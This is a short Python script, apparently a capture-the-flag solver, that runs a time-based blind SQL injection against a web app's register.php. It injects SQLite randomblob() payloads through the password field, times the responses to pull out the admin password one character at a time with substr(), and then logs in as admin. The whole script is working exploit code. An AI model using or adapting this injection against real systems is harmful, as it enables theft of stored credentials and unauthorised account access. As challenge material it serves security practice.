import requests
import time
import string
import os

host = os.environ["CHALLENGE_HOST"]
port = os.environ["CHALLENGE_PORT"]

URL = "http://{}:{}/".format(host, port)

t1 = time.time()
r = requests.post(
    URL + "register.php",
    data={
        "username": "takoyaki{}".format(t1),
        "password": "'||(select randomblob(0)) || 'x",
    },
)
t2 = time.time()

t3 = time.time()
r = requests.post(
    URL + "register.php",
    data={
        "username": "takoyaki{}".format(t3),
        "password": "'||(select randomblob(100000000)) || 'x",
    },
)
t4 = time.time()

assert (t4 - t3) > 2 * (t2 - t1)

THRESHOLD = (t4 - t3) - 2 * (t2 - t1)
flag = ""
while True:
    found = False
    for c in "_{}-!?0987654321" + string.ascii_letters:
        t1 = time.time()
        r = requests.post(
            URL + "register.php",
            data={
                "username": "takoyaki{}".format(t1),
                "password": "'||(select randomblob(100000000 * count(*)) from users where username='admin' and substr(password, {}, 1) = '{}') || 'x".format(
                    len(flag) + 1, c
                ),
            },
        )
        t2 = time.time()

        if t2 - t1 > THRESHOLD:
            flag += c
            print(flag)
            found = True
            break
    if not found:
        break

r = requests.post(URL + "login.php", data={"username": "admin", "password": flag})
print(r.text)
